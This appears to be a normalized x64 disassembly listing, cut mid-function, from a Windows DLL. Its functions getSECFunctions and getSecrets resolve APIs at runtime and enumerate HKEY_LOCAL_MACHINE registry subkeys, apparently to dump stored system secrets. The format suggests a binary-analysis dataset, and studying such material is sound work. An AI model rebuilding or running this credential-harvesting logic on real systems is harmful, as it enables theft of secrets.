mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_180007270
nop
xor r8d r8d
call sub_1800037f0
nop
or edx 0x4
mov rsi rdi
cmp [ r12 + 0x8 ] rdi
cmove rsi r12
lea rcx [ rsp + 0xb8 ]
call sub_18001778c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rbx
mov rbx [ rsp + 0xa8 ]
add rsp 0x70
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
nop
dec rax
mov [ r12 + 0x8 ] rax
sub_18000d590
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x70
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0xa8 ] rbx
movzx r14d dx
mov rbx rcx
xor edi edi
mov [ rsp + 0xb0 ] edi
mov [ rsp + 0x50 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rcx [ rbx ]
movsxd rax [ rcx + 0x4 ]
cmp [ rax + rbx + 0x10 ] 0x0
sete al
mov [ rsp + 0x58 ] al
test al al
je r-xdata
mov rcx [ rcx + rbx + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x30 ]
call sub_180003910
nop
mov rcx rax
call sub_180008f80
mov r13 rax
mov r12 [ rsp + 0x30 ]
test r12 r12
je r-xdata
call sub_180003da0
call j_sub_18001c100
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
movsxd r9 [ rax + 0x4 ]
add r9 rbx
mov rax [ r9 + 0x48 ]
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x48 ] rax
movzx ecx [ r9 + 0x58 ]
movaps xmm0 [ rsp + 0x40 ]
movdqa [ rsp + 0x40 ] xmm0
mov r10 [ r13 ]
movzx eax r14w
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] cx
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x60 ]
mov rcx r13
call [ r10 + 0x30 ]
mov eax 0x4
cmp [ rsp + 0x60 ] 0x0
cmovne edi eax
mov [ rsp + 0xb0 ] edi
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xb8 ]
call sub_18001775c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_180007270
nop
xor r8d r8d
call sub_1800037f0
nop
or edx 0x4
mov rsi rdi
cmp [ r12 + 0x8 ] rdi
cmove rsi r12
lea rcx [ rsp + 0xb8 ]
call sub_18001778c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rbx
mov rbx [ rsp + 0xa8 ]
add rsp 0x70
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
nop
dec rax
mov [ r12 + 0x8 ] rax
sub_18000d770
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x70
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0xa8 ] rbx
mov r14d edx
mov rbx rcx
xor edi edi
mov [ rsp + 0xb0 ] edi
mov [ rsp + 0x50 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rcx [ rbx ]
movsxd rax [ rcx + 0x4 ]
cmp [ rax + rbx + 0x10 ] 0x0
sete al
mov [ rsp + 0x58 ] al
test al al
je r-xdata
mov rcx [ rcx + rbx + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x30 ]
call sub_180003910
nop
mov rcx rax
call sub_180008f80
mov r13 rax
mov r12 [ rsp + 0x30 ]
test r12 r12
je r-xdata
call sub_180003da0
call j_sub_18001c100
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
movsxd r9 [ rax + 0x4 ]
add r9 rbx
mov rax [ r9 + 0x48 ]
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x48 ] rax
movzx eax [ r9 + 0x58 ]
movaps xmm0 [ rsp + 0x40 ]
movdqa [ rsp + 0x40 ] xmm0
mov r10 [ r13 ]
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] ax
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x60 ]
mov rcx r13
call [ r10 + 0x38 ]
mov eax 0x4
cmp [ rsp + 0x60 ] 0x0
cmovne edi eax
mov [ rsp + 0xb0 ] edi
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xb8 ]
call sub_18001775c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_180007270
nop
xor r8d r8d
call sub_1800037f0
nop
or edx 0x4
mov rsi rdi
cmp [ r12 + 0x8 ] rdi
cmove rsi r12
lea rcx [ rsp + 0xb8 ]
call sub_18001778c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rbx
mov rbx [ rsp + 0xa8 ]
add rsp 0x70
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
dec rax
mov [ r12 + 0x8 ] rax
sub_18000d950
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x70
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0xa8 ] rbx
mov r14 rdx
mov rbx rcx
xor edi edi
mov [ rsp + 0xb0 ] edi
mov [ rsp + 0x50 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rcx [ rbx ]
movsxd rax [ rcx + 0x4 ]
cmp [ rax + rbx + 0x10 ] 0x0
sete al
mov [ rsp + 0x58 ] al
test al al
je r-xdata
mov rcx [ rcx + rbx + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x30 ]
call sub_180003910
nop
mov rcx rax
call sub_180008f80
mov r13 rax
mov r12 [ rsp + 0x30 ]
test r12 r12
je r-xdata
call sub_180003da0
call j_sub_18001c100
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
movsxd r9 [ rax + 0x4 ]
add r9 rbx
mov rax [ r9 + 0x48 ]
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x48 ] rax
movzx eax [ r9 + 0x58 ]
movaps xmm0 [ rsp + 0x40 ]
movdqa [ rsp + 0x40 ] xmm0
mov r10 [ r13 ]
mov [ rsp + 0x28 ] r14
mov [ rsp + 0x20 ] ax
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x60 ]
mov rcx r13
call [ r10 + 0x8 ]
mov eax 0x4
cmp [ rsp + 0x60 ] 0x0
cmovne edi eax
mov [ rsp + 0xb0 ] edi
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xb8 ]
call sub_18001775c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_180007270
nop
xor r8d r8d
call sub_1800037f0
nop
or edx 0x4
mov rsi rdi
cmp [ r12 + 0x8 ] rdi
cmove rsi r12
lea rcx [ rsp + 0xb8 ]
call sub_18001778c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rbx
mov rbx [ rsp + 0xa8 ]
add rsp 0x70
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
nop
dec rax
mov [ r12 + 0x8 ] rax
sub_18000db30
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x68 ] rsi
movzx edi dx
mov rbx rcx
xor esi esi
mov [ rsp + 0x60 ] esi
mov [ rsp + 0x28 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
sete al
mov [ rsp + 0x30 ] al
test al al
jne r-xdata
mov rcx [ rcx + rbx + 0x50 ]
test rcx rcx
je r-xdata
mov rcx [ rcx + rbx + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov ecx 0x4
jmp r-xdata
call sub_180003da0
mov rax [ rcx ]
movzx edx di
call [ rax + 0x18 ]
movzx edi ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax [ rbx ]
movsxd r9 [ rax + 0x4 ]
add r9 rbx
test ecx ecx
je r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] di
jmp r-xdata
call j_sub_18001c100
test al al
jne r-xdata
mov edx [ r9 + 0x10 ]
or edx ecx
cmp [ r9 + 0x48 ] 0x0
jne r-xdata
mov ecx 0x4
mov eax 0xffff
cmp ax di
cmove esi ecx
mov ecx esi
mov [ rsp + 0x60 ] ecx
jmp r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_180007270
nop
xor r8d r8d
mov rcx r9
call sub_1800037f0
nop
or edx 0x4
mov rax rbx
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x40
pop rdi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
sub_18000dc80
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rcx
mov [ rsp + 0x48 ] 0x0
lea rax [ r--data ]
mov [ rcx ] rax
lea rax [ r--data ]
mov [ rcx + 0x88 ] rax
mov [ rsp + 0x48 ] 0x1
lea rdx [ rcx + 0x8 ]
call sub_18000de60
nop
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rdi ] rax
lea rcx [ rdi + 0x8 ]
call sub_1800050e0
nop
lea rax [ r--data ]
mov [ rdi + 0x8 ] rax
mov [ rdi + 0x78 ] 0x0
mov [ rdi + 0x80 ] 0x4
mov rax rdi
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_18000dd20
mov [ rsp + 0x8 ] rcx
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rax [ rcx - 0x88 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x88 ] rax
lea rbx [ rcx - 0x80 ]
lea rax [ r--data ]
mov [ rbx ] rax
test [ rbx + 0x78 ] 0x1
je r-xdata
mov rax [ rbx + 0x20 ]
xor ecx ecx
mov [ rax ] rcx
mov rax [ rbx + 0x40 ]
mov [ rax ] rcx
mov rax [ rbx + 0x58 ]
mov [ rax ] ecx
mov rax [ rbx + 0x28 ]
mov [ rax ] rcx
mov rax [ rbx + 0x48 ]
mov [ rax ] rcx
mov rax [ rbx + 0x60 ]
mov [ rax ] ecx
mov [ rbx + 0x70 ] rcx
and [ rbx + 0x78 ] 0xfffffffe
mov rcx rbx
call sub_180003e40
nop
mov rax [ rbx - 0x8 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rbx - 0x8 ] rax
add rsp 0x30
pop rbx
retn
mov rax [ rbx + 0x20 ]
mov rcx [ rax ]
call j_sub_180018b3c
sub_18000de00
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rsi [ rcx - 0x88 ]
mov edi edx
lea rcx [ rsi + 0x88 ]
call sub_18000dd20
lea rax [ r--data ]
lea rcx [ rsi + 0x88 ]
mov [ rsi + 0x88 ] rax
call sub_180017208
test dil 0x1
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rax rsi
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rsi
call j_sub_180018b3c
sub_18000de60
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x50 ] rsi
mov rbx rdx
mov rdi rcx
mov [ rsp + 0x48 ] 0x0
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
lea rax [ r--data ]
mov [ r8 + rcx ] rax
mov rax [ rcx ]
movsxd rsi [ rax + 0x4 ]
add rsi rcx
mov rcx rsi
call sub_180003960
mov [ rsi + 0x48 ] rbx
mov [ rsi + 0x50 ] 0x0
mov rcx rsi
call sub_180005300
mov [ rsi + 0x58 ] ax
cmp [ rsi + 0x48 ] 0x0
jne r-xdata
mov rax rdi
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov edx [ rsi + 0x10 ]
or edx 0x4
xor r8d r8d
mov rcx rsi
call sub_1800037f0
jmp r-xdata
sub_18000def0
mov rax rsp
mov [ rax + 0x8 ] rcx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rsi
mov r13 rdx
mov rsi rcx
xor ebx ebx
mov [ rsp + 0x78 ] ebx
mov r14 [ rdx + 0x10 ]
mov rax [ rcx ]
movsxd rcx [ rax + 0x4 ]
mov rdi [ rcx + rsi + 0x28 ]
test rdi rdi
jle r-xdata
xor edi edi
cmp rdi r14
jbe r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rsi + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
sub rdi r14
jmp r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rsi + 0x10 ] 0x0
sete al
mov [ rsp + 0x30 ] al
test al al
jne r-xdata
mov rcx [ rcx + rsi + 0x50 ]
test rcx rcx
je r-xdata
mov r15 rsi
mov [ rsp + 0x28 ] rsi
mov rcx [ rcx + rsi + 0x48 ]
test rcx rcx
je r-xdata
mov eax [ rcx + rsi + 0x18 ]
and eax 0x1c0
mov r12d 0xffff
cmp eax 0x40
je r-xdata
mov ebx 0x4
jmp r-xdata
call sub_180003da0
cmp [ r13 + 0x18 ] 0x8
jb r-xdata
nop [ rax ] eax
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test ebx ebx
je r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx ]
mov r8 r14
mov rdx r13
call [ rax + 0x48 ]
cmp rax r14
je r-xdata
mov r13 [ r13 ]
test ebx ebx
jne r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rsi + 0x58 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
call j_sub_18001c100
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
test rdi rdi
je r-xdata
mov ebx 0x4
jmp r-xdata
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax [ r15 ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + r15 + 0x48 ]
test rcx rcx
je r-xdata
mov rcx r15
call sub_180007270
nop
xor r8d r8d
call sub_1800037f0
nop
or edx 0x4
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov [ rcx + rsi + 0x28 ] 0x0
jmp r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rsi + 0x58 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x78 ] ebx
dec rdi
jmp r-xdata
or ebx 0x4
mov [ rsp + 0x78 ] ebx
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
mov rax rsi
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rdi rdi
je r-xdata
cmp r12w r8w
jne r-xdata
dec rdi
jmp r-xdata
or ebx 0x4
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
cmp r12w r8w
jne r-xdata
sub_18000e140
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
lea rcx [ r--data ]
mov [ rsp + 0x20 ] rbx
call [ GetModuleHandleW@IAT ]
mov rbx rax
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rax [ rw-data ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
add rsp 0x28
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
mov rbx [ rsp + 0x20 ]
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x1
add rsp 0x28
retn
test rax rax
je r-xdata
mov eax 0x1
add rsp 0x28
retn
getSECFunctions
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x140
lea rax [ r--data ]
mov rdi rcx
lea rcx [ rsp + 0xa8 ]
mov [ rsp + 0x20 ] rax
lea rax [ r--data ]
xor ebx ebx
mov [ rsp + 0xa8 ] rax
mov [ rsp + 0x160 ] ebx
call sub_180003960
lea r11 [ rsp + 0x28 ]
lea rcx [ rsp + 0xa8 ]
mov [ rsp + 0xf8 ] rbx
mov [ rsp + 0xf0 ] r11
call sub_180005300
mov [ rsp + 0x100 ] ax
cmp [ rsp + 0xf0 ] rbx
jne r-xdata
mov rax [ rsp + 0x20 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rsp + rcx + 0x20 ] rax
lea rcx [ rsp + 0x28 ]
call sub_1800050e0
lea r11 [ r--data ]
mov [ rsp + 0x98 ] rbx
mov [ rsp + 0x28 ] r11
mov [ rsp + 0xa0 ] 0x4
call sub_18000e140
lea rcx [ r--data ]
test al al
lea rbx [ r--data ]
cmovne rbx rcx
lea rcx [ rsp + 0x20 ]
lea rdx [ r--data ]
call sub_180008ab0
mov rdx rbx
mov rcx rax
call sub_180008ab0
mov rcx rax
call sub_180009790
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ rsp + 0x110 ]
lea rcx [ rsp + 0x20 ]
call sub_18000ddd0
mov rcx rdi
mov rdx rax
call sub_180001b10
lea rcx [ rsp + 0xa8 ]
movzx ebx al
call sub_18000dd20
lea r11 [ r--data ]
lea rcx [ rsp + 0xa8 ]
mov [ rsp + 0xa8 ] r11
call sub_180017208
movzx eax bl
mov rbx [ rsp + 0x150 ]
add rsp 0x140
pop rdi
retn
mov edx [ rsp + 0xb8 ]
lea rcx [ rsp + 0xa8 ]
xor r8d r8d
or edx 0x4
call sub_1800037f0
getSecrets
push rbp
push rbx
push r13
lea rbp [ rsp - 0x230 ]
sub rsp 0x330
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x210 ] rax
mov rbx rdx
mov r13 rcx
mov [ rbp - 0x38 ] rcx
call sub_18000e140
test al al
je r-xdata
mov rdx rbx
mov rcx r13
call getSECFunctions
lea rcx [ rbp - 0x48 ]
mov [ rsp + 0x360 ] rdi
mov dil 0x1
call [ rw-data ]
test eax eax
js r-xdata
xor ebx ebx
lea rdx [ r--data ]
lea rcx [ rsp + 0x78 ]
lea r8d [ rbx + 0x2a ]
mov [ rbp - 0x70 ] 0x7
mov [ rbp - 0x78 ] rbx
mov [ rsp + 0x78 ] bx
call sub_1800023b0
lea rdx [ rsp + 0x78 ]
mov rcx r13
call sub_180001b10
movzx edi al
mov rdi [ rsp + 0x360 ]
jmp r-xdata
lea rax [ rbp - 0x60 ]
lea rdx [ r--data ]
mov r9d 0x20019
xor r8d r8d
mov rcx 0xffffffff80000002
mov [ rsp + 0x20 ] rax
call [ RegOpenKeyExW@IAT ]
xor ebx ebx
test eax eax
jne r-xdata
mov rcx [ rbp + 0x210 ]
xor rcx rsp
call sub_180018450
add rsp 0x330
pop r13
pop rbx
pop rbp
retn
lea rdx [ r--data ]
lea rcx [ rsp + 0x78 ]
mov r8d 0x2c
mov [ rbp - 0x70 ] 0x7
mov [ rbp - 0x78 ] rbx
mov [ rsp + 0x78 ] bx
call sub_1800023b0
lea rdx [ rsp + 0x78 ]
mov rcx r13
call sub_180001b10
lea rcx [ rbp - 0x48 ]
movzx edi al
call [ rw-data ]
movzx eax dil
mov rdi [ rsp + 0x360 ]
jmp r-xdata
mov rcx [ rbp - 0x60 ]
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x38 ] rbx
lea rax [ rsp + 0x74 ]
mov [ rsp + 0x30 ] rbx
xor r9d r9d
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x6c ]
xor r8d r8d
xor edx edx
mov [ rsp + 0x328 ] r14
mov [ rsp + 0x20 ] rax
call [ RegQueryInfoKeyW@IAT ]
test eax eax
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x78 ]
mov r8d 0x45
mov [ rbp - 0x70 ] 0x7
mov [ rbp - 0x78 ] rbx
mov [ rsp + 0x78 ] bx
call sub_1800023b0
lea rdx [ rsp + 0x78 ]
mov rcx r13
call sub_180001b10
movzx edi al
mov r14d ebx
mov [ rsp + 0x68 ] ebx
cmp [ rsp + 0x6c ] ebx
jbe r-xdata
mov rcx [ rbp - 0x60 ]
call [ RegCloseKey@IAT ]
mov r14 [ rsp + 0x328 ]
lea rcx [ rbp - 0x48 ]
call [ rw-data ]
movzx eax dil
mov rdi [ rsp + 0x360 ]
jmp r-xdata
mov [ rsp + 0x358 ] rsi
mov [ rsp + 0x368 ] r12
mov [ rsp + 0x320 ] r15
lea r15d [ rbx + 0x4 ]
or r8 0xffffffffffffffff
lea rsi [ r--data ]
nop [ rax + rax ] ax
mov rcx [ rbp - 0x50 ]
call j_sub_180018b3c#2
inc r14d
mov r8 0xffffffffffffffff
mov [ rsp + 0x68 ] r14d
cmp r14d [ rsp + 0x6c ]
jb r-xdata
movzx eax [ rsp + 0x70 ]
mov rdx [ rbp - 0x50 ]
lea rcx [ rbp + 0x1e8 ]
add ax ax
mov [ rbp + 0x200 ] 0x7
mov [ rbp + 0x1f8 ] rbx
movzx r8d ax
mov [ rbp - 0x58 ] ax
mov [ rbp - 0x56 ] ax
shr r8 0x1
mov [ rbp + 0x1e8 ] bx
call sub_1800023b0
lea rcx [ rbp + 0xd0 ]
call sub_18000dc80
lea rcx [ rbp + 0xd0 ]
mov edx 0xa
call sub_18000db30
mov rax [ rbp + 0xd0 ]
mov edi ebx
movsxd rcx [ rax + 0x4 ]
test [ rbp + rcx + 0xe0 ] 0x6
jne r-xdata
mov eax [ rsp + 0x74 ]
mov [ rbp - 0x58 ] ebx
lea eax [ rax + rax + 0x2 ]
mov ecx eax
mov [ rsp + 0x70 ] eax
mov eax 0x2
mul rcx
cmovo rax r8
mov rcx rax
call j_sub_180018a08
mov rcx [ rbp - 0x60 ]
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x30 ] rbx
lea r9 [ rsp + 0x70 ]
mov r8 rax
mov edx r14d
mov [ rsp + 0x28 ] rbx
mov [ rbp - 0x50 ] rax
mov [ rsp + 0x20 ] rbx
call [ RegEnumKeyExW@IAT ]
test eax eax
jne r-xdata
mov r15 [ rsp + 0x320 ]
mov r12 [ rsp + 0x368 ]
mov rsi [ rsp + 0x358 ]
jmp r-xdata
movsxd rax [ rax + 0x4 ]
lea rcx [ rbp + rax + 0xd0 ]
test edi edi
je r-xdata
mov rcx [ rbp + rcx + 0x118 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
mov rax [ rbp + 0xd0 ]
cmove edi r15d
lea rdx [ r--data ]
lea rcx [ rbp + 0xd0 ]
call sub_180008ab0
lea rdx [ rbp + 0x1e8 ]
mov rcx rax
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ rbp + 0x1c0 ]
lea rcx [ rbp + 0xd0 ]
call sub_18000ddd0
mov rcx r13
mov rdx rax
call sub_180001b10
mov rcx [ rbp - 0x48 ]
lea r9 [ rbp - 0x40 ]
lea rdx [ rbp - 0x58 ]
mov r8d 0x2
movzx edi al
call [ rw-data ]
test eax eax
js r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] rbx
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rbp + 0x1c0 ]
mov r8d 0x27
mov [ rbp + 0x1d8 ] 0x7
mov [ rbp + 0x1d0 ] rbx
mov [ rbp + 0x1c0 ] bx
call sub_1800023b0
lea rdx [ rbp + 0x1c0 ]
mov rcx r13
call sub_180001b10
movzx edi al
mov rcx [ rbp - 0x40 ]
lea rdx [ rsp + 0x60 ]
xor r9d r9d
xor r8d r8d
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x20 ] rbx
call [ rw-data ]
test eax eax
js r-xdata
xor r8d r8d
call sub_1800037f0
or edx r15d
mov rcx [ rbp + 0x1e8 ]
call j_sub_180018b3c
lea rdx [ r--data ]
lea rcx [ rsp + 0x78 ]
mov r8d 0x2b
mov [ rbp - 0x70 ] 0x7
mov [ rbp - 0x78 ] rbx
mov [ rsp + 0x78 ] bx
